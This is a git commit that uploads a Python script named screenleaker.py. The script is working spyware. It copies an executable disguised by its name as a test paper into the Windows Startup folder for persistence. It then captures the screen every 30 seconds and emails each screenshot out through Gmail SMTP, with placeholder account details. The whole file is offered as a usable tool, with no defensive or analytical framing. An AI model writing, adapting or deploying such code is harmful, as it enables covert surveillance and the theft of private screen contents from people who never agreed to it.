466961ea5ddd6b2217dbec6c65fc013bbac00535
jason1343 <96876149+jason1343@users.noreply.github.com>
2023-02-19 11:29:56 +0900

    Add files via upload

---
+++ screenleaker.py
@@ -0,0 +1,50 @@
+import pyautogui
+import smtplib
+import os
+from email.encoders import encode_base64
+from email.header import Header
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.utils import formatdate
+import time as t
+import shutil
+
+src_path = r"./leakingtestpaper.exe"
+dst_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+listapp=os.listdir("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
+
+if "screenleaker.exe" not in listapp:
+    shutil.copy(src_path, dst_path)
+
+
+while True:
+    t.sleep(30)
+    myScreenshot = pyautogui.screenshot()
+    myScreenshot.save(r'./screenshot.png')
+
+    msg = MIMEMultipart()
+
+    msg['To'] = 'your gmail'
+    msg['From'] = 'your gmail'
+    msg['Subject'] = Header(s='here\'s a test paper =)', charset='utf-8')
+    body = MIMEText('check it out.', _charset='utf-8')
+    msg.attach(body)
+
+    f = './screenshot.png'
+    part = MIMEBase('application', "octet-stream")
+    part.set_payload(open(f, "rb").read())
+    encode_base64(part)
+    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(f))
+    msg.attach(part)
+
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+
+    server.starttls()
+
+    server.login('your gmail', 'your app password')
+    server.send_message(msg)
+    server.quit()
+    print("mail sent")
